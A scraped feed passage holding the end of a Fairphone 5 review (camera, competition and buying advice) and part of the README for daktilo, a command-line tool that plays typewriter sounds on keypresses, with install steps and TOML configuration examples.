src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-camera-interface.jpg"> </picture> </figure> </div>
<!-- Repeatable debug data: {"injection":"before","adPosition":11,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":11,"nbrPlacementsScanned":12,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1070} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":12,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":12,"nbrPlacementsScanned":12,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<p>Fairphone upgraded its camera array to a trio of 50MP cameras front and back, with a 50MP IMX800 primary, a 50MP ultra-wide, and a 50MP selfie camera. On paper, this setup is promising and should be competitive, but it shows that photography and videography has become a software problem more than something that can be fixed through hardware alone.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":12,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":12,"nbrPlacementsScanned":13,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":349} -->
<p>Fairphone’s cameras offer significantly less dynamic range, with highlights easily blown out and shadows barely visible. It’s more in line with how a DSLR would take pictures, which isn’t necessarily a bad thing, but it’s very different from the way other phones handle photography these days.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":12,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":12,"nbrPlacementsScanned":13,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":666} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":12,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":12,"nbrPlacementsScanned":13,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":906} -->
<p><em>A gallery of sample images straight from the camera</em></p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":12,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":12,"nbrPlacementsScanned":13,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":957} -->
<p>You certainly have to accommodate for that when composing a shot. There are also some issues with oversaturation in tungsten lighting conditions, and some discrepancies in color science across the primary camera and the ultrawide lens. The camera still serves well for images that you don't want to print out on a big canvas, and some of the color problems can be mitigated with a bit of editing.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":12,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":12,"nbrPlacementsScanned":13,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1357} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":13,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":13,"nbrPlacementsScanned":13,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<p>Fairphone rolled out updated software in the midst of our review, complete with some improvements to the camera, and I do feel like both the oversaturation problem and HDR performance have both improved. I'm sure things will only get better with more software updates, and maybe we will see a GCam camera mod down the line that takes things even farther. However, as always, I can only judge the phone in the state it currently is in and not based on potential future updates. Overall, the camera is certainly serviceable — impressive, even, considering Fairphone has far fewer engineering resources than Google, Apple, and Samsung.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":13,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":13,"nbrPlacementsScanned":14,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":642} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":13,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":13,"nbrPlacementsScanned":14,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":882} -->
<p><em>A gallery of sample images straight from the camera </em></p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":13,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":13,"nbrPlacementsScanned":14,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":934} -->
<p>The camera software also isn’t as reliable as I would like it to be. For example, Fairphone doesn’t offer an automatic night mode, forcing you to manually enable it whenever you need it instead. The zoom controls are also more finicky than I would like them to be, with a single button letting you cycle between 1x, 2x, and ultrawide that also turns into a zoom slider when you hold and slide on it.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":13,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":13,"nbrPlacementsScanned":14,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1345} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":14,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":14,"nbrPlacementsScanned":14,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":14,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":14,"nbrPlacementsScanned":15,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<h2 id="competition"> Competition </h2>
<div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/google-pixel-7-fairphone-5-apple-iphone-13-1.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="1500px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/google-pixel-7-fairphone-5-apple-iphone-13-1.jpg?q=50&amp;fit=crop&amp;w=1500&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/google-pixel-7-fairphone-5-apple-iphone-13-1.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/google-pixel-7-fairphone-5-apple-iphone-13-1.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/google-pixel-7-fairphone-5-apple-iphone-13-1.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="4080" height="3072" alt="The Google Pixel 7, the Fairphone 5, and the Apple iPhone 13 next to each other on a green background with random items sprinkled around them" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/google-pixel-7-fairphone-5-apple-iphone-13-1.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/google-pixel-7-fairphone-5-apple-iphone-13-1.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":14,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":14,"nbrPlacementsScanned":15,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":240} -->
<p><em>The Google Pixel 7, the Fairphone 5, and the Apple iPhone 13 next to each other</em></p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":14,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":14,"nbrPlacementsScanned":15,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":319} -->
<p>There isn’t really any comparable repairable phone out there that is sold as broadly as the Fairphone 5, but of course, we can’t look at the handset in isolation. At its £650 price tag, there is plenty of competition. First and foremost, I think of the <a href="https://www.androidpolice.com/google-pixel-7-review/">Google Pixel 7</a>, which offers a better build quality in a smaller body and a much better camera experience. However, Google only gives you five years of security updates and three big Android updates, with one of them — Android 14 — right around the corner today. Google also makes replacing parts much more complicated.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":14,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":14,"nbrPlacementsScanned":15,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":921} -->
<p>If you want a phone with a comparable lifecycle as the Fairphone 5, the iPhone 15 comes closest. Apple is known to support its devices for years to come, so it’s likely you could be able to use the iPhone 15 for the next eight to 10 years if you’re really pushing for it. While the iPhone isn’t self-repairable, Apple offers walk-in stores and mail-in service almost everywhere in the world.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":14,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":14,"nbrPlacementsScanned":15,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1330} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":15,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":15,"nbrPlacementsScanned":15,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<p>Fairphone isn’t only about repairable hardware, though. The Fair in its name stands for its mission to build a fairer supply chain, with living wages for everyone involved building the phone, from engineers over factory workers to miners. The company also sources its materials as fairly as possible, making sure raw materials are either recycled or ethically mined. While Apple may claim that it’s on a path to provide the latter, too, I don’t think that workers in the lower parts of its supply chain are paid nearly as well as those working on the Fairphone. If your environmental and social impact is important for you, Fairphone is virtually peerless in this field.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":15,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":15,"nbrPlacementsScanned":16,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":688} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":15,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":15,"nbrPlacementsScanned":16,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":688} -->
<h2 id="should-you-buy-it"> Should you buy it? </h2>
<p>The Fairphone 5 is a special phone. It shows the industry how repairable and fairly sourced handsets can be created without compromising too much on design and only a little bit on price. At the same time, these are exactly the points that make it hard to recommend for many people.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":15,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":15,"nbrPlacementsScanned":16,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":970} -->
<p>When you buy the Fairphone, you pay a high price for a phone that should last you for a long time, all while it’s unclear how well the hardware will hold up over the next eight years. For our planet and for the sake of social responsibility, the Fairphone 5 is still the best smartphone choice you can make. You'll just have to consider how committed to the cause you really are before you pull the trigger on your purchase.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":15,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":15,"nbrPlacementsScanned":16,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1404} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":16,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":16,"nbrPlacementsScanned":16,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<div><div><div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg" data-img-desc="&quot;Source: Fairphone&quot;" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="&quot;&quot;"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="320px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg?q=50&amp;fit=crop&amp;w=320&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="400px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg?q=50&amp;fit=crop&amp;w=400&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="300px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg?q=50&amp;fit=crop&amp;w=300&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="2741" height="2741" alt="fairphone-5-tag-image" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-tag-image.jpg"> </picture> </figure> </div><p>Source: Fairphone</p> </div><div> <h5> Fairphone 5 </h5><p>The Fairphone 5 is the phone to choose if you value repairability and environmental responsibility above everything, but it may not be easy to come by in the US. It's possible that the company will launch it soon, though, maybe in the form of a cooperation with Murena, like it did with the Fairphone 4.</p> </div> </div></div>

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":16,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":16,"nbrPlacementsScanned":17,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->


                
                            

            </article>
    
    
    
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Daktilo: Turn Your Keyboard into a Typewriter (143 pts)]]></title>
            <link>https://github.com/orhun/daktilo</link>
            <guid>37751311</guid>
            <pubDate>Tue, 03 Oct 2023 13:05:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/orhun/daktilo">https://github.com/orhun/daktilo</a>, See on <a href="https://news.ycombinator.com/item?id=37751311">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text">
<p dir="auto"><strong>daktilo</strong> ("typewriter" in Turkish, pronounced <em>"duck-til-oh"</em>, derived from the Ancient Greek word <a href="https://lsj.gr/wiki/%CE%B4%CE%AC%CE%BA%CF%84%CF%85%CE%BB%CE%BF%CF%82" rel="nofollow">δάκτυλος</a> for "finger") is a small command-line program that plays typewriter sounds every time you press a key. It also offers the flexibility to customize keypress sounds to your liking. You can use the built-in sound presets to create an enjoyable typing experience, whether you're crafting emails or up to some prank on your boss.</p>
<p dir="auto">✨ Inspiration: <a href="https://www.youtube.com/watch?v=Bs5TEuZPQl8" rel="nofollow">"Taking notes in class with my typewriter"</a></p>
<p dir="auto">Now you can recreate this moment without the actual need for a physical typewriter!</p>
<details>
  <summary>Table of Contents</summary>

<ul dir="auto">
<li><a href="#getting-started">Getting Started</a></li>
<li><a href="#supported-platforms">Supported Platforms</a></li>
<li><a href="#installation">Installation</a>
<ul dir="auto">
<li><a href="#cargo">Cargo</a></li>
<li><a href="#arch-linux">Arch Linux</a></li>
<li><a href="#alpine-linux">Alpine Linux</a></li>
<li><a href="#binary-releases">Binary releases</a></li>
<li><a href="#build-from-source">Build from source</a></li>
</ul>
</li>
<li><a href="#usage">Usage</a></li>
<li><a href="#configuration">Configuration</a>
<ul dir="auto">
<li><a href="#adding-custom-presets">Adding custom presets</a></li>
</ul>
</li>
<li><a href="#similar-projects">Similar Projects</a></li>
<li><a href="#acknowledgements">Acknowledgements</a></li>
<li><a href="#donations">Donations</a></li>
<li><a href="#contributing">Contributing</a></li>
<li><a href="#license">License</a></li>
<li><a href="#copyright">Copyright</a></li>
</ul>

</details>
<h2 tabindex="-1" id="user-content-getting-started" dir="auto"><a href="#getting-started">Getting Started</a></h2>
<p dir="auto">Simply run <code>daktilo</code> for the classic typewriter effect.</p>
<p dir="auto">There are also different presets available:</p>
<table>
<thead>
<tr>
<th>Preset Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>default</code></td>
<td>the classic typewriter effect</td>
</tr>
<tr>
<td><code>basic</code></td>
<td>an alternative and more basic typewriter effect</td>
</tr>
<tr>
<td><code>musicbox</code></td>
<td>plays random notes like a music box</td>
</tr>
<tr>
<td><code>ducktilo</code></td>
<td>quack quack 🦆</td>
</tr>
<tr>
<td><code>drumkit</code></td>
<td>dum, tss, cha! 🥁</td>
</tr>
</tbody>
</table>
<p dir="auto">To list the presets:</p>

<p dir="auto">To use a preset:</p>
<div dir="auto" data-snippet-clipboard-copy-content="daktilo --preset musicbox"><pre>daktilo --preset musicbox</pre></div>
<h2 tabindex="-1" id="user-content-supported-platforms" dir="auto"><a href="#supported-platforms">Supported Platforms</a></h2>
<ul>
<li> Linux
<ul>
<li> X11</li>
<li> Wayland<a href="https://github.com/Narsil/rdev#linux">*</a></li>
</ul>
</li>
<li> Windows</li>
<li> MacOS</li>
</ul>
<h2 tabindex="-1" id="user-content-installation" dir="auto"><a href="#installation">Installation</a></h2>
<details>
  <summary>Packaging status</summary>
<p dir="auto"><a href="https://repology.org/project/daktilo/versions" rel="nofollow"><img src="https://camo.githubusercontent.com/b5bacb4eea93be65681c1c7803459c2ede6f6a933ecb4d6ff3bf476422852c09/68747470733a2f2f7265706f6c6f67792e6f72672f62616467652f766572746963616c2d616c6c7265706f732f64616b74696c6f2e737667" alt="Packaging status" data-canonical-src="https://repology.org/badge/vertical-allrepos/daktilo.svg"></a></p>
</details>
<h3 tabindex="-1" id="user-content-cargo" dir="auto"><a href="#cargo">Cargo</a></h3>
<p dir="auto"><strong>daktilo</strong> can be installed from <a href="https://crates.io/crates/daktilo" rel="nofollow">crates.io</a>:</p>

<p dir="auto">The minimum supported Rust version is <code>1.70.0</code>.</p>
<h3 tabindex="-1" id="user-content-arch-linux" dir="auto"><a href="#arch-linux">Arch Linux</a></h3>
<p dir="auto"><strong>daktilo</strong> can be installed from the <a href="https://archlinux.org/packages/extra/x86_64/daktilo/" rel="nofollow">official repositories</a> using <a href="https://wiki.archlinux.org/title/Pacman" rel="nofollow">pacman</a>:</p>

<h3 tabindex="-1" id="user-content-alpine-linux" dir="auto"><a href="#alpine-linux">Alpine Linux</a></h3>
<p dir="auto"><strong>daktilo</strong> is available for <a href="https://pkgs.alpinelinux.org/packages?name=daktilo&amp;branch=edge" rel="nofollow">Alpine Edge</a>. It can be installed via <a href="https://wiki.alpinelinux.org/wiki/Alpine_Package_Keeper" rel="nofollow">apk</a> after enabling the <a href="https://wiki.alpinelinux.org/wiki/Repositories" rel="nofollow">testing repository</a>.</p>

<h3 tabindex="-1" id="user-content-binary-releases" dir="auto"><a href="#binary-releases">Binary releases</a></h3>
<p dir="auto">See the available binaries for different targets from the <a href="https://github.com/orhun/daktilo/releases">releases page</a>.</p>
<h3 tabindex="-1" id="user-content-build-from-source" dir="auto"><a href="#build-from-source">Build from source</a></h3>
<ol dir="auto">
<li>Clone the repository.</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/orhun/daktilo &amp;&amp; cd daktilo/"><pre>git clone https://github.com/orhun/daktilo <span>&amp;&amp;</span> <span>cd</span> daktilo/</pre></div>
<ol start="2" dir="auto">
<li>Build.</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="CARGO_TARGET_DIR=target cargo build --release"><pre>CARGO_TARGET_DIR=target cargo build --release</pre></div>
<p dir="auto">Binary will be located at <code>target/release/daktilo</code>.</p>
<h2 tabindex="-1" id="user-content-usage" dir="auto"><a href="#usage">Usage</a></h2>

<p dir="auto"><strong>Options</strong>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="-v, --verbose          Enables verbose logging [env: VERBOSE=]
-p, --preset <PRESET>  Sets the name of the sound preset to use [env: PRESET=]
-l, --list             Lists the available presets
-c, --config <PATH>    Sets the configuration file [env: DAKTILO_CONFIG=]
-i, --init             Writes the default configuration file
-h, --help             Print help
-V, --version          Print version"><pre>-v, --verbose          Enables verbose logging [env: VERBOSE<span>=</span>]
-p, --preset <span>&lt;</span>PRESET<span>&gt;</span>  Sets the name of the sound preset to use [env: PRESET<span>=</span>]
-l, --list             Lists the available presets
-c, --config <span>&lt;</span>PATH<span>&gt;</span>    Sets the configuration file [env: DAKTILO_CONFIG<span>=</span>]
-i, --init             Writes the default configuration file
-h, --help             Print <span>help</span>
-V, --version          Print version</pre></div>
<h2 tabindex="-1" id="user-content-configuration" dir="auto"><a href="#configuration">Configuration</a></h2>
<p dir="auto"><strong>daktilo</strong> can be configured with a configuration file using the <a href="https://en.wikipedia.org/wiki/TOML" rel="nofollow">TOML</a> format.</p>
<p dir="auto">The path of the configuration file can be specified via <code>--config</code> argument or <code>DAKTILO_CONFIG</code> environment variable.</p>
<p dir="auto">It can also be placed in one of the following global locations:</p>
<ul dir="auto">
<li><code>&lt;config_dir&gt;</code> <code>/</code> <code>daktilo.toml</code></li>
<li><code>&lt;config_dir&gt;</code> <code>/</code> <code>daktilo/daktilo.toml</code></li>
<li><code>&lt;config_dir&gt;</code> <code>/</code> <code>daktilo/config</code></li>
</ul>
<p dir="auto"><code>&lt;config_dir&gt;</code> depends on the platform as shown in the following table:</p>
<table>
<thead>
<tr>
<th>Platform</th>
<th>Value</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>Linux</td>
<td><code>$XDG_CONFIG_HOME</code> or <code>$HOME</code>/.config</td>
<td>/home/orhun/.config</td>
</tr>
<tr>
<td>macOS</td>
<td><code>$HOME</code>/Library/Application Support</td>
<td>/Users/Orhun/Library/Application Support</td>
</tr>
<tr>
<td>Windows</td>
<td><code>{FOLDERID_RoamingAppData}</code></td>
<td>C:\Users\Orhun\AppData\Roaming</td>
</tr>
</tbody>
</table>
<p dir="auto">See <a href="https://github.com/orhun/daktilo/blob/main/config/daktilo.toml">daktilo.toml</a> for the default configuration options.</p>
<p dir="auto">You can also create the default configuration file in the current directory with <code>--init</code> flag:</p>

<h3 tabindex="-1" id="user-content-adding-custom-presets" dir="auto"><a href="#adding-custom-presets">Adding custom presets</a></h3>
<p dir="auto">The configuration file consists of an array of <code>sound_preset</code> entries.</p>
<p dir="auto">To define an array in TOML, you can create different sections as follows:</p>
<div dir="auto" data-snippet-clipboard-copy-content="[[sound_preset]]
name = &quot;custom&quot;
key_config = []

[[sound_preset]]
name = &quot;another_custom&quot;
key_config = []
disabled_keys = []"><pre>[[<span>sound_preset</span>]]
<span>name</span> = <span><span>"</span>custom<span>"</span></span>
<span>key_config</span> = []

[[<span>sound_preset</span>]]
<span>name</span> = <span><span>"</span>another_custom<span>"</span></span>
<span>key_config</span> = []
<span>disabled_keys</span> = []</pre></div>
<p dir="auto">As shown above, <code>sound_preset</code> consists of 2 entries:</p>
<ul dir="auto">
<li><code>name</code>: The name of the preset. It will be used in conjunction with <code>--preset</code> flag. e.g. <code>--preset custom</code></li>
<li><code>key_config</code>: An array of key press/release events for assigning audio files to the specified keys. It can also be used to control the volume etc.</li>
<li><code>disabled_keys</code>: An array of keys that will not be used for playback.</li>
</ul>
<details>
  <summary>Click for the <a href="https://docs.rs/rdev/latest/rdev/enum.Key.html" rel="nofollow">list of available keys</a>.</summary>
<p dir="auto"><code>Alt</code>, <code>AltGr</code>, <code>Backspace</code>, <code>CapsLock</code>, <code>ControlLeft</code>, <code>ControlRight</code>, <code>Delete</code>, <code>DownArrow</code>, <code>End</code>, <code>Escape</code>, <code>F1</code>, <code>F10</code>, <code>F11</code>, <code>F12</code>, <code>F2</code>, <code>F3</code>, <code>F4</code>, <code>F5</code>, <code>F6</code>, <code>F7</code>, <code>F8</code>, <code>F9</code>, <code>Home</code>, <code>LeftArrow</code>, <code>MetaLeft</code>, <code>MetaRight</code>, <code>PageDown</code>, <code>PageUp</code>, <code>Return</code>, <code>RightArrow</code>, <code>ShiftLeft</code>, <code>ShiftRight</code>, <code>Space</code>, <code>Tab</code>, <code>UpArrow</code>, <code>PrintScreen</code>, <code>ScrollLock</code>, <code>Pause</code>, <code>NumLock</code>, <code>BackQuote</code>, <code>Num1</code>, <code>Num2</code>, <code>Num3</code>, <code>Num4</code>, <code>Num5</code>, <code>Num6</code>, <code>Num7</code>, <code>Num8</code>, <code>Num9</code>, <code>Num0</code>, <code>Minus</code>, <code>Equal</code>, <code>KeyQ</code>, <code>KeyW</code>, <code>KeyE</code>, <code>KeyR</code>, <code>KeyT</code>, <code>KeyY</code>, <code>KeyU</code>, <code>KeyI</code>, <code>KeyO</code>, <code>KeyP</code>, <code>LeftBracket</code>, <code>RightBracket</code>, <code>KeyA</code>, <code>KeyS</code>, <code>KeyD</code>, <code>KeyF</code>, <code>KeyG</code>, <code>KeyH</code>, <code>KeyJ</code>, <code>KeyK</code>, <code>KeyL</code>, <code>SemiColon</code>, <code>Quote</code>, <code>BackSlash</code>, <code>IntlBackslash</code>, <code>KeyZ</code>, <code>KeyX</code>, <code>KeyC</code>, <code>KeyV</code>, <code>KeyB</code>, <code>KeyN</code>, <code>KeyM</code>, <code>Comma</code>, <code>Dot</code>, <code>Slash</code>, <code>Insert</code>, <code>KpReturn</code>, <code>KpMinus</code>, <code>KpPlus</code>, <code>KpMultiply</code>, <code>KpDivide</code>, <code>Kp0</code>, <code>Kp1</code>, <code>Kp2</code>, <code>Kp3</code>, <code>Kp4</code>, <code>Kp5</code>, <code>Kp6</code>, <code>Kp7</code>, <code>Kp8</code>, <code>Kp9</code>, <code>KpDelete</code>, <code>Function</code>, <code>Unknown</code></p>
</details>
<p dir="auto">As an example, here is how you can configure <code>key_config</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="key_config = [
  { event = &quot;press&quot;, keys = &quot;return&quot;, files = [{ path = &quot;ding.mp3&quot;, volume = 1.0 }] },
]"><pre><span>key_config</span> = [
  { <span>event</span> = <span><span>"</span>press<span>"</span></span>, <span>keys</span> = <span><span>"</span>return<span>"</span></span>, <span>files</span> = [{ <span>path</span> = <span><span>"</span>ding.mp3<span>"</span></span>, <span>volume</span> = <span>1.0</span> }] },
]</pre></div>
<ul dir="auto">
<li><code>event</code>: "press" or "release"</li>
<li><code>keys</code>: A regular expression (regex) for matching the keys.</li>
<li><code>files</code>: An array of files.
<ul dir="auto">
<li><code>path</code>: The absolute path of the file. If the file is embedded in the binary (i.e. if it is inside <code>sounds/</code> directory) then it is the name of the file without full path.</li>
<li><code>volume</code>: The volume of the sound. The value 1.0 is the "normal" volume (unfiltered input). Any value other than 1.0 will multiply each sample by this value.</li>
</ul>
</li>
</ul>
<p dir="auto">If you have defined multiple files for a key event, you can also specify a strategy for how to play them:</p>
<div dir="auto" data-snippet-clipboard-copy-content="key_config = [
  { event = &quot;press&quot;, keys = &quot;.*&quot;, files = [{ path = &quot;1.mp3&quot; }, { path = &quot;2.mp3&quot; }], strategy = &quot;random&quot; },
]"><pre><span>key_config</span> = [
  { <span>event</span> = <span><span>"</span>press<span>"</span></span>, <span>keys</span> = <span><span>"</span>.*<span>"</span></span>, <span>files</span> = [{ <span>path</span> = <span><span>"</span>1.mp3<span>"</span></span> }, { <span>path</span> = <span><span>"</span>2.mp3<span>"</span></span> }], <span>strategy</span> = <span><span>"</span>random<span>"</span></span> },
]</pre></div>
<p dir="auto">Currently supported strategies are:</p>
<ul dir="auto">
<li><code>strategy = "random"</code>: pick a random file from the list and play it.</li>
<li><code>strategy = "sequential"</code>: play the files sequentially.</li>
</ul>
<p dir="auto">Here is how you can combine everything together:</p>
<div dir="auto" data-snippet-clipboard-copy-content="[[sound_preset]]
# Custom sound preset named &quot;custom&quot;
name = &quot;custom&quot;

# Key configurations for various events
key_config = [
  # When a key starting with &quot;Key&quot; is pressed, play 1.mp3, 2.mp3, and 3.mp3 sequentially
  { event = &quot;press&quot;, keys = &quot;Key*&quot;, files = [
    { path = &quot;1.mp3&quot; },
    { path = &quot;2.mp3&quot; },
    { path = &quot;3.mp3&quot; },
  ], strategy = &quot;sequential&quot; },

  # When a key starting with &quot;Key&quot; is released, play 4.mp3
  { event = &quot;release&quot;, keys = &quot;Key*&quot;, files = [
    { path = &quot;4.mp3&quot; },
  ] },

  # When a key starting with &quot;Num&quot; is pressed, play num.mp3 at a very high volume (10.0)
  { event = &quot;press&quot;, keys = &quot;Num*&quot;, files = [
    { path = &quot;num.mp3&quot;, volume = 10.0 },
  ] },

  # When any key is pressed, play a random sound from cat.mp3, dog.mp3, or bird.mp3
  { event = &quot;press&quot;, keys = &quot;.*&quot;, files = [
    { path = &quot;cat.mp3&quot; },
    { path = &quot;dog.mp3&quot; },
    { path = &quot;bird.mp3&quot; },
  ], strategy = &quot;random&quot; },
]

# Disabled keys that won't trigger any sound events
disabled_keys = [&quot;CapsLock&quot;, &quot;NumLock&quot;]"><pre>[[<span>sound_preset</span>]]
<span><span>#</span> Custom sound preset named "custom"</span>
<span>name</span> = <span><span>"</span>custom<span>"</span></span>

<span><span>#</span> Key configurations for various events</span>
<span>key_config</span> = [
  <span><span>#</span> When a key starting with "Key" is pressed, play 1.mp3, 2.mp3, and 3.mp3 sequentially</span>
  { <span>event</span> = <span><span>"</span>press<span>"</span></span>, <span>keys</span> = <span><span>"</span>Key*<span>"</span></span>, <span>files</span> = [
    { <span>path</span> = <span><span>"</span>1.mp3<span>"</span></span> },
    { <span>path</span> = <span><span>"</span>2.mp3<span>"</span></span> },
    { <span>path</span> = <span><span>"</span>3.mp3<span>"</span></span> },
  ], <span>strategy</span> = <span><span>"</span>sequential<span>"</span></span> },

  <span><span>#</span> When a key starting with "Key" is released, play 4.mp3</span>
  { <span>event</span> = <span><span>"</span>release<span>"</span></span>, <span>keys</span> = <span><span>"</span>Key*<span>"</span></span>, <span>files</span> = [
    { <span>path</span> = <span><span>"</span>4.mp3<span>"</span></span> },
  ] },

